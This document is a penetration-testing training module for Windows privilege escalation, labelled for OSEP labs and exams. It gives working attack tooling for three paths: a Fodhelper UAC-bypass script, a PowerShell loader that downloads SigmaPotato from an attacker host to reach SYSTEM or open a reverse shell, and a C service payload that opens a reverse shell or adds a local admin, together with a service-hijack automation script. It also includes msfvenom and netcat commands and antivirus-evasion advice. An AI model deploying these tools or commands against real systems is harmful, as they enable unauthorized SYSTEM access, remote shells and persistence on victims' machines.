::: warning Authorized use only
For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
:::

# UAC bypass and local privilege escalation

If you already have a shell, pick the path from the token you have now. Admin on a filtered token → Fodhelper. Service context with SeImpersonate → PrintSpoofer / SigmaPotato. Writable high-privilege service → hijack the binary.

Check identity first:

```powershell
whoami /all                     # Mandatory Label (integrity), Privileges (SeImpersonate, etc.)
net localgroup administrators    # already a local Administrators member?
sc qc <ServiceName>              # used later for service hijack
```

After you elevate, collect credentials ([07-credentials-lsass](/modules/07-credentials-lsass)) or move laterally ([15-winrm-lateral](/modules/15-winrm-lateral)).

## Admin, but medium integrity

If `whoami /groups` shows `Mandatory Label\Medium Mandatory Level` and the user is in `BUILTIN\Administrators`, use a Fodhelper-style UAC bypass. This only works when UAC is on (`EnableLUA=1`) and the user is already an Administrators member. If `EnableLUA=0`, you are already high integrity — no bypass needed. If the user is not an admin, this path is dead; go to SeImpersonate or service hijack.

The default `ConsentPromptBehaviorAdmin=5` is "prompt for consent for non-Windows binaries", not "prompt for credentials" (that is 1 or 3). Auto-elevate still requires Administrators membership. If the prompt behavior is always-ask (value 2, consent on the secure desktop), this path may not apply.

- [ ] Confirm Administrators membership and medium integrity
- [ ] Generate the payload and start a listener
- [ ] Write `DelegateExecute` (empty string) first, then the default command value
- [ ] Trigger `fodhelper.exe` (or `computerdefaults.exe` / `wsreset.exe` / `slui.exe`)
- [ ] Confirm `High Mandatory Level` in the new process
- [ ] Delete the registry key

Generate a payload and listen:

```bash
# 1. Generate reverse shell or beacon
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT -f exe -o svc.exe   # service-binary example
# or prepare a fileless second stage: m06-fodhelper-uac.ps1 embeds a PAYLOAD variable

# 2. Attacker listener
nc -lvnp LPORT            # or msfconsole handler / CS listener
```

`fodhelper.exe` (Windows Features helper under `C:\Windows\System32`, auto-elevate by default) queries `HKCU\Software\Classes\ms-settings\Shell\Open\command` at start; if present it runs that command **at high integrity**. Because the key is under `HKCU`, an unelevated process can write it.

```powershell
# On target (medium-integrity shell / webshell)
# 1) Write the high-rights command to run (reverse shell or add admin):
#    DelegateExecute must exist (empty string); default value holds the command
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "cmd.exe /c powershell -nop -w hidden -enc <BASE64>" /f
# Note: command carriers and trigger hosts — multiple variants in m06-fodhelper-uac.ps1; do not reverse /ve then /v order

# 2) Trigger (may briefly flash a UAC UI then vanish, or silent elevate, depending on settings):
fodhelper.exe
# Alternate hosts: computerdefaults.exe  /  wsreset.exe (Win10 1803-1903)  /  slui.exe

# 3) Clean the registry key (important!):
reg delete "HKCU\Software\Classes\ms-settings" /f
```

Integrated script: `m06-fodhelper-uac.ps1` (writes keys, triggers, optional delayed cleanup).

Verify: `whoami /groups` in the new process shows `High Mandatory Level`; `net session` no longer reports "Access is denied", or you can read admin-only paths.

If the command never ran and there is no error, start `cmd /c fodhelper.exe` yourself and confirm the empty `DelegateExecute` string plus the default value name — then try `computerdefaults.exe`. If AMSI or Defender kills the default Metasploit module (`exploit/windows/local/bypassuac_fodhelper`), put an AMSI bypass plus a short download cradle in the registry value (course §12.5.2) instead of that module. If AV blocks `reg add` or the spawn, split the write and the trigger (write from the shell, trigger via `schtasks /run`); payload as fileless encoded PowerShell plus AMSI handling (module 05); clean the key afterward. If Fodhelper is disabled or redirected by policy, try `computerdefaults.exe`, `wsreset.exe`, or `slui.exe`. If AlwaysInstallElevated is on (`HKLM` and `HKCU` `...\Windows Installer` both 1), `msiexec /quiet /qn /i payload.msi` elevates directly — probe both registry paths first (the script includes probe commands).

Always delete the key after use — later Settings-class actions for that user will re-trigger the command and leave persistence. Fodhelper may flash a UAC dialog in an interactive session; prefer a short, non-interactive command. Callbacks use `LHOST`/`LPORT`; do not hardcode attacker LAN IPs. What you get is still a **same-user** high-integrity token, not SYSTEM — go to credentials (module 07) or, if you still need SYSTEM, SeImpersonate or service hijack.

::: details `m06-fodhelper-uac.ps1` · click to expand

````powershell
<#
Purpose: When the current user is a local Administrators member but the session is unelevated (medium integrity), use Fodhelper/ComputerDefaults-style auto-elevate hosts to run a high-rights command, then auto-clean the registry key
Scenario: docs/06-uac-windows-privesc.md scenario 25 (unelevated admin token → UAC Bypass)
Depends: PowerShell 3.0+ (2.0 can run the core logic); requires UAC on (EnableLUA=1) and user in local Administrators; works via IEX or -f
Usage: powershell -nop -w hidden -ep bypass -f m06-fodhelper-uac.ps1 -Command "cmd.exe /c whoami > C:\Windows\Temp\ok.txt"
       # Typical: bounce a high-integrity PowerShell, then IEX a reverse shell yourself:
       powershell -ep bypass -f m06-fodhelper-uac.ps1 -Command "powershell -nop -w hidden -enc <BASE64>"
       # Alternate hosts: -HostBin ComputerDefaults | Wsreset | Fodhelper (default); -DelaySeconds controls cleanup delay; -Keep retains the registry key
Placeholders: BASE64=encoded second-stage command (attacker: iconv -t UTF-16LE|base64); LHOST/LPORT already encoded into BASE64
Test status: Not run on Windows (host is macOS); syntax checked by hand. Validate trigger + cleanup once in an isolated VM first
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)][string]$Command,
    [ValidateSet("Fodhelper", "ComputerDefaults", "Wsreset")]
    [string]$HostBin = "Fodhelper",
    [int]$DelaySeconds = 5,
    [switch]$Keep,
    [switch]$DryRun          # write key + print host that would trigger; do not actually start (debug)
)

$ErrorActionPreference = "Stop"
$KeyPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
$BinMap = @{
    Fodhelper        = "C:\Windows\System32\fodhelper.exe"        # Win10/11, Server 2016+ — most general
    ComputerDefaults = "C:\Windows\System32\ComputerDefaults.exe" # same ms-settings protocol, backup
    Wsreset          = "C:\Windows\System32\wsreset.exe"          # Win10 1803~1903; fixed on newer builds
}
$HostExe = $BinMap[$HostBin]

function Test-AdminMember {
    # Whether the user is in local Administrators (hard prerequisite for UAC bypass)
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $p  = New-Object Security.Principal.WindowsPrincipal($id)
    return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Test-Elevated {
    # Whether the session is already high integrity (if so, no bypass needed)
    try { $t = (whoami /groups | Select-String "S-1-16-12288") -ne $null; return $t }
    catch { return $false }
}

function Write-Log($m) { Write-Output ("[{0}] {1}" -f (Get-Date -Format "HH:mm:ss"), $m) }

# ---------- Pre-checks ----------
if (-not (Test-Elevated)) { Write-Log "session is not high integrity — continuing" } else { Write-Log "already high integrity; no bypass needed (run the command directly)"; exit 0 }
if (-not (Test-AdminMember)) {
    Write-Log "[-] current user is not in local Administrators — Fodhelper path unavailable (UAC bypass needs Administrators membership)"
    Write-Log "[-] switch to: AlwaysInstallElevated probe / service priv-esc (see docs/06 scenarios 26/27)"
    exit 1
}
if (-not (Test-Path $HostExe)) { Write-Log "[-] host $HostExe missing — change -HostBin or retest on a newer system"; exit 1 }

# ---------- Write registry ----------
Write-Log "[+] writing $KeyPath (DelegateExecute empty + default value = command)"
try {
    New-Item -Path $KeyPath -Force | Out-Null
    New-ItemProperty -Path $KeyPath -Name "DelegateExecute" -PropertyType String -Value "" -Force | Out-Null
    Set-ItemProperty -Path $KeyPath -Name "(default)" -Value $Command -Force
    Write-Log "[+] command written: (default) = $Command"
} catch {
    Write-Log "[-] registry write failed: $($_.Exception.Message) (check policy/AV block)"
    exit 1
}

if ($DryRun) {
    Write-Log "[DryRun] would trigger: $HostExe (not started)"
    if (-not $Keep) { Remove-Item -Path $KeyPath -Recurse -Force -ErrorAction SilentlyContinue }
    exit 0
}

# ---------- Trigger ----------
Write-Log "[+] triggering $HostExe ... (may briefly flash UAC or a black window)"
try { Start-Process -FilePath $HostExe -WindowStyle Hidden | Out-Null } catch { Start-Process -FilePath $HostExe | Out-Null }

# ---------- Wait and clean ----------
Write-Log "[+] waiting $DelaySeconds s then cleaning registry key (avoid persistence leftovers)"
Start-Sleep -Seconds $DelaySeconds
if ($Keep) {
    Write-Log "[!] -Keep set: retaining $KeyPath (clean manually before exam hand-in)"
} else {
    Remove-Item -Path $KeyPath -Recurse -Force -ErrorAction SilentlyContinue
    if (Test-Path $KeyPath) { Write-Log "[-] cleanup failed — manually: reg delete HKCU\Software\Classes\ms-settings /f" }
    else { Write-Log "[+] registry key cleaned" }
}

# ---------- Verify hints ----------
Write-Log "[*] verify: whoami /groups in reverse/child process should show High Mandatory Level (S-1-16-12288)"
Write-Log "[*] failure triage: A) DelegateExecute written?  B) try -HostBin ComputerDefaults  C) user really Administrators member?  D) command itself blocked by AV? (first prove high rights with cmd /c whoami > file)"
````

:::
## SeImpersonate in a service context

If the foothold is a service account or local service context (IIS AppPool, SQL `xp_cmdshell`, a Windows service) and `whoami /priv` shows `SeImpersonatePrivilege` (or `SeAssignPrimaryTokenPrivilege`), go for `NT AUTHORITY\SYSTEM`. If the privilege is present but Disabled, restore it with FullPowers first, then retry. If the host is Windows 10/11 or Server 2016+, try PrintSpoofer first — it is easier. If egress is constrained or PrintSpoofer fails, use a SigmaPotato local variant (no callback needed). If the host is older (Server 2008/2012, Win7/8), go to JuicyPotato / RoguePotato.

- [ ] Confirm `SeImpersonatePrivilege` is **Enabled** (`whoami /priv`)
- [ ] Land the tool (AppPool-writable dir, `%TEMP%`, or reflective load)
- [ ] Start a listener if the tool callbacks (PrintSpoofer); skip it for local Potato variants
- [ ] Execute and confirm `whoami` is `nt authority\system`

PrintSpoofer (https://github.com/itm4n/PrintSpoofer) and SigmaPotato (https://github.com/Kevin-Robertson/SigmaPotato) are the usual pair. Build C++ tools in VS as x64; match static/dynamic to the target.

```bash
# Attacker listener (PrintSpoofer needs one; SigmaPotato local variants do not):
nc -lvnp LPORT
```

```powershell
# 0) Confirm the privilege is actually enabled (many tool failures are Disabled privilege → FullPowers / enable first):
whoami /priv

# 1) Upload/land the tool (IIS AppPool-writable dirs, %TEMP%, etc.)
# 2) PrintSpoofer — local elevate, reverse to attacker:
PrintSpoofer64.exe -i -c "cmd.exe /c powershell -nop -w hidden -enc <BASE64>"   # -i interactive (local popup)
PrintSpoofer64.exe -c "cmd.exe /c powershell -nop -w hidden -enc <BASE64>"      # or reverse directly

# 3) SigmaPotato (network constrained / no egress needed):
#    local variant runs with no extra args → prints SYSTEM shell command templates
SigmaPotato.exe -cmd "cmd /c whoami"                                            # test
SigmaPotato.exe -cmd "powershell -nop -w hidden -enc <BASE64>"                  # execute

# 4) Older systems (Server 2008/2012, Win7/8):
#    When RoguePotato / PrintSpoofer do not apply, use JuicyPotato (2012/2016 older) or Potato family
```

If you cannot land an EXE, use `m06-sigmapotato-reflect.ps1` (memory-loads SigmaPotato; also the fallback when auto tools fail). Alternates: PrintSpoofer binary, JuicyPotato, RoguePotato, SpoolSample.

Verify: `whoami` returns `nt authority\system`; `whoami /groups` shows `Mandatory Label\High Mandatory Level`.

If the tool exits immediately, check whether the privilege is Disabled — FullPowers (https://github.com/itm4n/FullPowers) or re-steal the token, then retry; also match OS to tool (PrintSpoofer needs Server 2016 / Win10 1607+; older hosts → JuicyPotato / RoguePotato). If AV kills the binary, switch to the reflective script or encode and memory-load (modules 05 / 01); last resort is a manual `DuplicateToken` plus a SYSTEM process (the script includes a minimal approach). If PrintSpoofer needs a callback but egress is blocked, switch to a local-loopback Potato variant, or coerce SYSTEM to a host you control (SpoolSample + relay — see modules 16 / 11). If you landed some other account, not SYSTEM, check the service run-as — under `NetworkService`, PrintSpoofer usually still reaches SYSTEM (the spooler is SYSTEM); if the service is a normal account without SeImpersonate, this path is dead → service hijack. On older hosts, confirm PowerShell / .NET first (the PowerShell SigmaPotato path has no native binary dependency).

SpoolSample in this section is **auth coercion**, not direct priv-esc — make the spooler trigger SYSTEM auth to a host you control, then relay or RPC-abuse (PrinterBug → LDAP / ADCS; see [12-ad-attacks](/modules/12-ad-attacks) ESC8). If every local potato path fails, this is the exam fallback.

Delete uploaded EXEs or park them in directories that get cleaned; a reflective script with no disk drop is quieter. Offset PrintSpoofer's `LHOST`/`LPORT` from the stage-one listener. Confirm once with `whoami`; do not spam SYSTEM shells. Interactive `-i` popups are useless in a service context with no desktop — always use `-c` with a command.

::: details `m06-sigmapotato-reflect.ps1` · click to expand

````powershell
<#
Purpose: In a SeImpersonate context, .NET-reflectively memory-load SigmaPotato.exe (no disk drop) and run an arbitrary SYSTEM command or reverse shell
Scenario: docs/06-uac-windows-privesc.md scenario 26 (IIS AppPool / SQL service account etc. → SYSTEM); also a manual fallback when PrintSpoofer is unavailable
Depends: PowerShell 3.0+; process token has SeImpersonatePrivilege (default for service accounts, but may be Disabled — see -CheckOnly); SigmaPotato.exe served over HTTP(S) from the attacker
Usage: powershell -nop -w hidden -ep bypass -f m06-sigmapotato-reflect.ps1 -Url http://LHOST/SigmaPotato.exe -RevShellIP LHOST -RevShellPort LPORT
       # command only: -Command "cmd /c whoami"
       # already downloaded locally: -LocalPath C:\Windows\Temp\SigmaPotato.exe -Command "..."
       # health-check only: -CheckOnly
Placeholders: LHOST=attacker IP; LPORT=listener port; URL=http://LHOST/SigmaPotato.exe (your delivery URL)
Test status: Not run on Windows (host is macOS); syntax checked by hand. If AMSI/AV blocks, handle AMSI first (see docs/05)
#>
[CmdletBinding()]
param(
    [string]$Url = "http://LHOST/SigmaPotato.exe",   # attacker: python3 -m http.server
    [string]$LocalPath = "",                          # already-on-disk SigmaPotato.exe (choose one)
    [string]$Command = "cmd /c whoami",               # plain command mode
    [string]$RevShellIP = "",                         # reverse-shell mode (mutually exclusive with -Command)
    [int]$RevShellPort = 0,
    [switch]$CheckOnly                                # only check privileges, do not execute
)

function Section($t) { Write-Output ""; Write-Output ("=" * 12 + " $t " + "=" * 12) }

Section "Privilege check (look here first on failure)"
$privOut = whoami /priv
$privOut | Write-Output
$hasImp = ($privOut | Select-String "SeImpersonatePrivilege") -ne $null
$enabled = $hasImp -and (($privOut | Select-String "SeImpersonatePrivilege") -match "Enabled")
if (-not $hasImp) {
    Write-Output "[-] No SeImpersonatePrivilege — potato techniques do not apply; switch to service hijack (docs/06 scenario 27)"
    exit 1
}
if (-not $enabled) {
    Write-Output "[!] SeImpersonatePrivilege present but DISABLED (common on service-account tokens)"
    Write-Output "[!] Restore the default privilege set with FullPowers, then re-run this script:"
    Write-Output "    FullPowers.exe -c `"powershell -ep bypass -f m06-sigmapotato-reflect.ps1 -Url $Url -RevShellIP $RevShellIP -RevShellPort $RevShellPort`""
    exit 1
}
Write-Output "[+] SeImpersonatePrivilege enabled — continuing"

if ($CheckOnly) { Write-Output "[CheckOnly] privileges ready. Drop -CheckOnly for real execution"; exit 0 }

Section "Load SigmaPotato assembly"
$bytes = $null
if ($LocalPath) {
    if (-not (Test-Path $LocalPath)) { Write-Output "[-] $LocalPath missing"; exit 1 }
    Write-Output "[+] reading local file: $LocalPath"
    $bytes = [IO.File]::ReadAllBytes($LocalPath)
} else {
    Write-Output "[+] downloading: $Url"
    try {
        $wc = New-Object System.Net.WebClient
        # Uncomment next line only if the target must use a proxy; default is direct
        $bytes = $wc.DownloadData($Url)
    } catch {
        Write-Output "[-] download failed: $($_.Exception.Message)"
        Write-Output "[-] fallbacks: A) local file via -LocalPath  B) certutil -urlcache -split -f $Url  C) change http port/UA"
        exit 1
    }
}
$asm = [System.Reflection.Assembly]::Load($bytes)
if (-not $asm) { Write-Output "[-] Assembly::Load returned null (file not a valid .NET assembly?)"; exit 1 }
$type = $asm.GetType("SigmaPotato")
if (-not $type) {
    Write-Output "[-] SigmaPotato type not found (version mismatch? when [SigmaPotato]::Main fails, list exported types:"
    Write-Output "    $($asm.GetExportedTypes() | ForEach-Object { $_.FullName })"
    exit 1
}

Section "Execute"
try {
    if ($RevShellIP -and $RevShellPort) {
        Write-Output "[+] reverse-shell mode: $RevShellIP : $RevShellPort"
        $type::Main(@("--revshell", $RevShellIP, "$RevShellPort"))
    } else {
        Write-Output "[+] command mode: $Command"
        $type::Main($Command)
    }
    Write-Output "[*] Main returned (or reverse already spawned in a child). Verify: whoami should be nt authority\system"
} catch {
    Write-Output "[-] execution exception: $($_.Exception.Message)"
    Write-Output "[-] failure triage: A) target too old (Win7/2008) → PrintSpoofer/SigmaPotato need Win10/2016+; switch JuicyPotato/RoguePotato"
    Write-Output "[-]               B) special chars in command got split → quote or land a cmd script first"
    Write-Output "[-]               C) AV blocks reflective load → AMSI/memory handling first (docs/05) or land and run"
    exit 1
}
````

:::
## Writable service binary

If a low-priv foothold can change a service that runs as `LocalSystem` (writable binary directory, or writable `ImagePath`) and can start or stop it — or the service restarts on reboot or crash — replace the binary, wait for SYSTEM to start it, then roll back.

- [ ] Enumerate writable services (`wmic` / `sc qc` / `accesschk`)
- [ ] Export the original registry key and back up the original exe **before** touching anything
- [ ] Build a payload that matches the service arch
- [ ] Replace the binary, or point `ImagePath` at the payload
- [ ] Trigger with `sc stop` / `sc start` (or a scheduled / reboot trigger)
- [ ] Confirm a SYSTEM shell, then restore immediately

Build the payload with `m06-service-binary-payload.c`:

```bash
#   x86_64-w64-mingw32-gcc -o svcpayload.exe m06-service-binary-payload.c   (Linux cross-compile)
#   or VS: cl m06-service-binary-payload.c
# Match service arch: 32-bit service process → build x86; 64-bit → x64.
```

```powershell
# 1) Enumerate writable services (three angles):
wmic service get name,pathname,startname | findstr /i "LocalSystem"
sc qc <svc>                          # StartType, BINARY_PATH_NAME, SERVICE_START_NAME
# Writable check with accesschk (Sysinternals):
accesschk.exe /accepteula -uwcqv "Authenticated Users" *     # full check is noisy — filter as needed
accesschk.exe /accepteula -uwcqv USER * | findstr /i "service"

# 2) Record original config (required for rollback!):
reg export "HKLM\SYSTEM\CurrentControlSet\Services\<svc>" C:\Windows\Temp\<svc>-backup.reg /y
# or note: ImagePath, ObjectName, Start, how ImagePath expands env vars

# 3) Land and replace:
#    Method A: directory writable → back up original exe, drop payload
copy /y "C:\Program Files\<vendor>\<svc>.exe" C:\Windows\Temp\<svc>.exe.bak
copy /y C:\Windows\Temp\svcpayload.exe "C:\Program Files\<vendor>\<svc>.exe"
#    Method B: directory not writable but ImagePath is (older/misconfigured) → point to attacker-controlled payload path
reg add "HKLM\SYSTEM\CurrentControlSet\Services\<svc>" /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\Temp\svcpayload.exe" /f
#    Method C (fallback): DLL hijack — drop a malicious DLL into the service dir so it loads before the original (depends on a known missing DLL)

# 4) Trigger:
sc stop <svc> ; sc start <svc>
# If not manually stoppable → try net stop / reboot (exam: use carefully) / schtasks timed trigger
# Some services crash-loop after one start — that can be useful for getting a shell

# 5) After SYSTEM shell callbacks, roll back immediately:
sc stop <svc>
copy /y C:\Windows\Temp\<svc>.exe.bak "C:\Program Files\<vendor>\<svc>.exe"
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\<svc>" /v ImagePath /f   # if method B
reg import C:\Windows\Temp\<svc>-backup.reg /y   # if method A and registry was changed
sc start <svc>                                   # restore original service (confirm it starts)
```

Automation: `m06-service-hijack.ps1` (saves and restores the original config). The C payload spawns a reverse shell or adds an admin; it does not register a service main, so `sc start` may error 1053 while the child already called back — that is expected.

Verify: the listener receives a SYSTEM shell (`whoami` → `nt authority\system`); after rollback, `sc start <svc>` succeeds and the original process is healthy.

If `sc start` reports "Access is denied", pick a startable service (prefer third-party, Auto start, no `ChangeConfig` protection), or use a scheduled task / Run key if you can write it (next logon or reboot). If the service fails to start after the replace, treat a returned shell as success and roll back; for a quieter "healthy" service, build a version with a minimal service main loop (`-DSERVICE_STAYALIVE` plus a dispatcher). If the file is locked or AV blocks the replace, stop the service first; if AV still blocks, set `ImagePath` to a host binary such as `powershell.exe -enc` instead of dropping a new EXE. If no writable service turns up, widen enum (`icacls` on third-party install dirs) or evaluate `sc create` if those rights exist; otherwise revisit Fodhelper / SeImpersonate. If rollback fails, `reg import` the backup and restart (see the script's Restore branch) — exporting the key and backing up the exe **before** the change is a hard requirement.

Rollback is a scoring point: do not break a service later stages still need. Prefer third-party or lab-planted weak services over built-in ones (Spooler is loud). Name the payload close to the original, land under `%TEMP%`, and delete after use. A reboot trigger may kill your other channels — use it carefully.

::: details `m06-service-binary-payload.c` · click to expand

````c
/*
Purpose: Payload for Windows service binary hijack — runs when the service starts as SYSTEM; default reverse shell (cmd straight back to attacker), or compile-time add-local-admin mode
Scenario: docs/06-uac-windows-privesc.md scenario 27 (low priv can replace/change a high-rights service binary → SYSTEM); triggered by sc start after replace
Depends: Windows (winsock2); compile with -lws2_32 (reverse-shell mode only)
Usage: Linux cross-compile (bitness must match the service process — confirm x86 vs x64 first):
      # reverse shell (default mode)
      x86_64-w64-mingw32-gcc m06-service-binary-payload.c -o svcpayload.exe -lws2_32
        -DLHOST=\"10.10.14.5\" -DLPORT=4444
      # add local admin (no callback needed — e.g. target egress constrained)
      x86_64-w64-mingw32-gcc m06-service-binary-payload.c -o svcpayload.exe -DMODE_ADDUSER \
        -DUSER=ops -DPASS=\"P@ssw0rd!2024\"
      # keep process alive (do not exit — more stable with restart loops; pairs with non-SCM-registered behavior)
      ... -DSERVICE_STAYALIVE
      # 32-bit services: i686-w64-mingw32-gcc (same args)
Placeholders: LHOST=attacker-reachable IP; LPORT=listener port; USER/PASS=admin account to add (defaults emma / Password123!)
Test status: Not runtime-tested (host macOS, no mingw cross chain); syntax checked by hand. Before the lab, validate once in an isolated VM with sc create
Note: when started by SCM this program does not register a service control dispatcher — sc start may report 1053. Treat shell/account side effects as success, then roll back per docs/06
*/
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

/* ---------- Config (override at compile with -D) ---------- */
#ifndef LHOST
#define LHOST "127.0.0.1"          /* attacker IP */
#endif
#ifndef LPORT
#define LPORT 4444                 /* attacker listener port */
#endif
#ifndef USER
#define USER "emma"                /* ADDUSER mode account name */
#endif
#ifndef PASS
#define PASS "Password123!"        /* ADDUSER mode password (must meet target policy) */
#endif

/* ---------- Mode 1: reverse shell (default) ---------- */
static int revshell(void)
{
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in addr;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        return 1;
    s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET)
        return 1;

    addr.sin_family = AF_INET;
    addr.sin_port = htons((unsigned short)LPORT);
    addr.sin_addr.s_addr = inet_addr(LHOST);
    /* no hostname resolve: give LHOST as an IP to avoid DNS dependency in service context */
    if (WSAConnect(s, (struct sockaddr *)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        closesocket(s);
        WSACleanup();
        return 1;
    }

    /* hand the socket to cmd.exe as std handles for an interactive shell */
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
    if (!CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        closesocket(s);
        WSACleanup();
        return 1;
    }
    /* child inherits the socket; parent handles can close immediately */
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}

/* ---------- Mode 2: add local admin (-DMODE_ADDUSER) ---------- */
static int addadmin(void)
{
    char buf[256];
    snprintf(buf, sizeof(buf), "net user %s %s /add", USER, PASS);
    system(buf);
    snprintf(buf, sizeof(buf), "net localgroup administrators %s /add", USER);
    system(buf);
    return 0;
}

int main(void)
{
#ifdef MODE_ADDUSER
    addadmin();
#else
    revshell();
#endif
#ifdef SERVICE_STAYALIVE
    /* service restart-loop scenarios: stay alive to avoid SCM restart noise */
    Sleep(INFINITE);
#endif
    return 0;
}
````

:::
::: details `m06-service-hijack.ps1` · click to expand

````powershell
<#
Purpose: Full automation for manual service binary hijack — save original config (registry export + original exe backup), replace with payload and start the service, then one-shot rollback to restore
Scenario: docs/06-uac-windows-privesc.md scenario 27 (auto service priv-esc tools failed, but you confirmed you can change a high-rights service binary or ImagePath)
Depends: PowerShell 3.0+ (Get-CimInstance); current user can start/stop/change that service; payload already uploaded (e.g. C:\Windows\Temp\svcpayload.exe)
Usage: hijack first:
       powershell -ep bypass -f m06-service-hijack.ps1 -ServiceName <svc> -PayloadPath C:\Windows\Temp\svcpayload.exe
       # after SYSTEM (whoami) confirmed, roll back:
       powershell -ep bypass -f m06-service-hijack.ps1 -Action Restore -ServiceName <svc>
       # when directory is not writable but ImagePath is, add -UseImagePath (ImagePath points at payload)
Placeholders: TARGET=target host; LHOST/LPORT already baked into the payload; USER/PASS mode — see m06-service-binary-payload.c
Test status: Not run on Windows (host is macOS); syntax checked by hand. Validate rollback logic once in an isolated VM
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)][ValidateSet("Hijack", "Restore")][string]$Action = "Hijack",
    [Parameter(Mandatory = $true)][string]$ServiceName,
    [string]$PayloadPath = "C:\Windows\Temp\svcpayload.exe",
    [switch]$UseImagePath,            # when directory not writable, change registry ImagePath to payload
    [int]$WaitSeconds = 8
)

$ErrorActionPreference = "Stop"
$StateFile = Join-Path $env:TEMP ("m06-" + $ServiceName + "-state.txt")

function Write-Log($m) { Write-Output ("[{0}] {1}" -f (Get-Date -Format "HH:mm:ss"), $m) }
function Get-Svc {
    Get-CimInstance Win32_Service -Filter "Name='$ServiceName'" -ErrorAction Stop
}
function Split-BinPath([string]$p) {
    # PathName may be "C:\Program Files\X\svc.exe" --arg; extract bare exe path
    $p = $p.Trim()
    if ($p.StartsWith('"')) { return ($p -split '"')[1] }
    return ($p -split '\s+')[0]
}

if (-not (Get-Svc)) { Write-Log "[-] service $ServiceName missing (names are case-sensitive — confirm with sc qc)"; exit 1 }

# ================= Restore =================
if ($Action -eq "Restore") {
    if (-not (Test-Path $StateFile)) { Write-Log "[-] state file $StateFile missing — no backup to restore; recover manually from the .reg / backup exe you exported then"; exit 1 }
    $s = Get-Content $StateFile | Out-String | ConvertFrom-StringData
    Write-Log "[+] stopping service and restoring original binary $($s.OriginalPath)"
    try { Stop-Service -Name $ServiceName -Force -ErrorAction Stop } catch { Write-Log "[!] stop failed: $($_.Exception.Message) (continuing copy attempt)" }
    Start-Sleep -Seconds 1
    try {
        if ($s.BackupPath -and (Test-Path $s.BackupPath)) {
            Copy-Item -Path $s.BackupPath -Destination $s.OriginalPath -Force
            Write-Log "[+] original exe copied back to $($s.OriginalPath)"
        }
        if ($s.RegBackup -and (Test-Path $s.RegBackup)) {
            reg import $s.RegBackup | Out-Null
            Write-Log "[+] registry restored from $($s.RegBackup)"
        }
        Remove-Item $StateFile -Force
    } catch { Write-Log "[-] rollback failed: $($_.Exception.Message)"; exit 1 }
    try { Start-Service -Name $ServiceName -ErrorAction Stop; Write-Log "[+] service restarted with original config (verify: sc query $ServiceName should be RUNNING)" }
    catch { Write-Log "[!] service failed to start: $($_.Exception.Message) (check whether .reg includes Startup password etc.)" }
    exit 0
}

# ================= Hijack =================
$svc  = Get-Svc
$bin  = Split-BinPath $svc.PathName
Write-Log "[+] service: $($svc.Name) | original binary: $bin | run-as: $($svc.StartName)"
if (-not (Test-Path $bin)) { Write-Log "[-] original binary missing $bin (path has variables? confirm manually)"; exit 1 }
if (-not (Test-Path $PayloadPath)) { Write-Log "[-] payload missing $PayloadPath — upload first"; exit 1 }

$stamp = Get-Date -Format "yyyyMMdd-HHmmss"
$regBackup = Join-Path $env:TEMP ("m06-" + $ServiceName + "-" + $stamp + ".reg")
$backupExe = Join-Path $env:TEMP ("m06-" + $ServiceName + "-" + $stamp + ".exe")

Write-Log "[+] saving original config: reg export + original exe backup"
reg export ("HKLM\SYSTEM\CurrentControlSet\Services\" + $ServiceName) $regBackup /y | Out-Null
Copy-Item -Path $bin -Destination $backupExe -Force
@("OriginalPath=$bin", "BackupPath=$backupExe", "RegBackup=$regBackup") | Set-Content -Path $StateFile -Encoding Ascii
Write-Log "[+] backup: exe→$backupExe ; reg→$regBackup"

Write-Log "[+] stopping service"
try { Stop-Service -Name $ServiceName -Force -ErrorAction Stop } catch { Write-Log "[-] cannot stop service: $($_.Exception.Message) (pick a stoppable service, or rely on reboot/timed trigger)"; exit 1 }

try {
    if ($UseImagePath) {
        Write-Log "[+] changing ImagePath → $PayloadPath (directory-not-writable fallback)"
        reg add ("HKLM\SYSTEM\CurrentControlSet\Services\" + $ServiceName) /v ImagePath /t REG_EXPAND_SZ /d $PayloadPath /f | Out-Null
    } else {
        Write-Log "[+] replacing binary: $bin ← $PayloadPath"
        Copy-Item -Path $PayloadPath -Destination $bin -Force
    }
    Write-Log "[+] starting service (trigger payload)"
    Start-Service -Name $ServiceName -ErrorAction SilentlyContinue
    Start-Sleep -Seconds $WaitSeconds
} catch {
    Write-Log "[!] trigger-stage exception: $($_.Exception.Message) (shell may already have called back — expected; when sc start reports 1053, payload side effects already happened)"
}

Write-Log "[*] verify: attacker listener should have a SYSTEM shell (whoami → nt authority\system)"
Write-Log "[*] after shell: roll back with -Action Restore -ServiceName $ServiceName"
Write-Log "[*] if Restore finds exe locked (payload process still alive): taskkill /F /IM <payload-name> then re-run Restore"
````

:::
## Cheat sheet

| Condition | Technique | Script / tool |
|---|---|---|
| Administrators member + medium integrity | Fodhelper / ComputerDefaults / AlwaysInstallElevated | `m06-fodhelper-uac.ps1` |
| SeImpersonate + service context | PrintSpoofer → SigmaPotato (when egress is constrained) → older JuicyPotato | `m06-sigmapotato-reflect.ps1` |
